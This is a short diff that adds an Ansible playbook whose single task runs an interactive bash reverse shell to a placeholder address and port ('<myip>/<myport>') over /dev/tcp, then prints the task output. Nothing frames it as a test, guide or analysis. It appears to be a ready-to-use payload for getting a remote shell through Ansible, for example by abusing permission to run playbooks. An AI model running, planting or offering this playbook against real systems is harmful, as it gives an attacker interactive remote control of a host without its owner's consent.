@@ -1,0 +1,8 @@
+- hosts: 127.0.0.1
+  connection: local
+  gather_facts: no
+  tasks:
+    - local_action: "shell /bin/bash -i > /dev/tcp/<myip>/<myport> 0<&1 2>&1"
+      register: ps
+
+    - debug: var="ps.stdout_lines + [ ps.stderr ]"
